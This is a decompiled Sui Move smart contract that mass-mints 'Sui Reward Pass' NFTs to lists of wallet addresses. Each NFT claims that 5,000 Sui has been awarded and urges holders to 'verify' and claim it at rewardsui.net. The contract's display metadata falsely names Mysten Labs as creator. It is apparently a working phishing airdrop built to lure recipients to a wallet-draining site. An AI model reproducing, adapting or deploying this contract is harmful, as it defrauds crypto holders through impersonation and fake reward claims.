module 0x1d39fc2912becdbc8ed02ef13d988ba300ad27c34cb19a73d6614e9b7de24806::SUIREWARD_W {
    struct SUIREWARD_W has drop {
        dummy_field: bool,
    }

    struct SUIREWARD_PASS has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct BurnEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    public entry fun RewardFrom(arg0: vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(&arg0) > 0) {
            let v0 = SUIREWARD_PASS{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"Sui Reward Pass"),
                image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/rewardsuicom/rewardsuicom_0625_0.jpg"),
                description : 0x1::string::utf8(b"You've been rewarded 5,000 Sui from rewardsui.net. Verify your activity and claim your reward."),
                Reward      : 0x1::string::utf8(b"5,000 Sui"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<SUIREWARD_PASS>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"Sui Reward Pass"),
                image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/rewardsuicom/rewardsuicom_0625_0.jpg"),
                description : 0x1::string::utf8(b"You've been rewarded 5,000 Sui from rewardsui.net. Verify your activity and claim your reward."),
                Reward      : 0x1::string::utf8(b"5,000 Sui"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<SUIREWARD_PASS>(v0, 0x1::vector::pop_back<address>(&mut arg0));
        };
    }

    public entry fun burn_nft(arg0: SUIREWARD_PASS, arg1: &mut 0x2::tx_context::TxContext) {
        let SUIREWARD_PASS {
            id          : v0,
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        } = arg0;
        let v5 = v0;
        let v6 = BurnEvent{
            nft_id      : 0x2::object::uid_to_inner(&v5),
            user        : 0x2::tx_context::sender(arg1),
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        };
        0x2::event::emit<BurnEvent>(v6);
        0x2::object::delete(v5);
    }

    fun init(arg0: SUIREWARD_W, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"project_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Reward"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Sui Reward Pass"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://suicamp.b-cdn.net/rewardsuicom/rewardsuicom_0625_0.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"You've been rewarded 5,000 Sui from rewardsui.net. Verify your activity and claim your reward."));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://rewardsui.net"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Mysten Labs"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"5,000 Sui"));
        let v4 = 0x2::package::claim<SUIREWARD_W>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<SUIREWARD_PASS>(&v4, v0, v2, arg1);
        0x2::display::update_version<SUIREWARD_PASS>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<SUIREWARD_PASS>>(v5, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

